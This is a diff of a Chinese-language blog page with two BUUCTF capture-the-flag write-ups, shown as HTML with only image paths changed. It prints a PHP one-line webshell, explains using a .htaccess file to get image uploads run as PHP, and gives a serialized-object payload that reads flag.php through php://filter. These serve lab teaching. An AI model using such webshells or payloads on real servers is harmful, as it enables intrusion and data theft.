@@ -57,9 +57,9 @@
             <h1 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h1><p>打开容器，是一道文件上传题</p>
 <h4 id="一-牛刀小试"><a href="#一-牛刀小试" class="headerlink" title="一.牛刀小试"></a>一.牛刀小试</h4><p>先上传一个普通一句话木马webshell.jpg：</p>
 <p><code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code></p>
-<p>，然后抓包修改后缀为php，发现上传失败<img src="/buuctf9.assets/image-20210719090306878.png" alt="image-20210719090306878"></p>
+<p>，然后抓包修改后缀为php，发现上传失败<img src="/2021/07/19/buuctf9/image-20210719090306878.png" alt="image-20210719090306878"></p>
 <p>然后我尝试了phtml、php3等都不能绕过</p>
-<p>试着直接上传webshell.jpg<img src="/buuctf9.assets/image-20210719090532184.png" alt="image-20210719090532184"></p>
+<p>试着直接上传webshell.jpg<img src="/2021/07/19/buuctf9/image-20210719090532184.png" alt="image-20210719090532184"></p>
 <p>看到它有回显给我们路径，尝试一下上传.user.ini，但是由于无法确定上传的文件夹内是否已经存在php后缀文件，我猜测存在index.php，但是很可惜失败了</p>
 <h4 id="二-另辟蹊径"><a href="#二-另辟蹊径" class="headerlink" title="二.另辟蹊径"></a>二.另辟蹊径</h4><p>这时候就要复习一个配置文件**.htaccess**</p>
 <p><strong>.htaccess</strong>可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p>
@@ -68,9 +68,9 @@
 
 <p>这样Apache会将我们指定的文件（webshell.jpg）以php格式解析</p>
 <p>这边还有一点要注意的是：</p>
-<p>上传.htaccess的时候要抓包修改修改文件类型：<img src="/buuctf9.assets/image-20210719092714176.png" alt="image-20210719092714176"></p>
-<p>最后我们用蚁剑连接就好了<img src="/buuctf9.assets/image-20210719091956225.png" alt="image-20210719091956225"></p>
-<p><img src="/buuctf9.assets/image-20210719092031620.png" alt="image-20210719092031620"></p>
+<p>上传.htaccess的时候要抓包修改修改文件类型：<img src="/2021/07/19/buuctf9/image-20210719092714176.png" alt="image-20210719092714176"></p>
+<p>最后我们用蚁剑连接就好了<img src="/2021/07/19/buuctf9/image-20210719091956225.png" alt="image-20210719091956225"></p>
+<p><img src="/2021/07/19/buuctf9/image-20210719092031620.png" alt="image-20210719092031620"></p>
 <h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><p>打开容器，发现一段代码</p>
 <h4 id="一-代码分段"><a href="#一-代码分段" class="headerlink" title="一.代码分段"></a>一.代码分段</h4><p>我把这段代码大致分成三部分：</p>
 <p><strong>第一部分</strong>交代了该文件下文件包含了flag.php文件</p>
@@ -92,7 +92,7 @@
 
 <p>代码执行输出b=<code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code></p>
 <p>payload:<code>http://cb84aa4b-0ded-48ad-b2e7-b1cc59cdfdb3.node4.buuoj.cn/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code></p>
-<p><img src="/buuctf9.assets/image-20210719214207190.png" alt="image-20210719214207190"></p>
+<p><img src="/2021/07/19/buuctf9/image-20210719214207190.png" alt="image-20210719214207190"></p>
 <p>base64解码得flag</p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
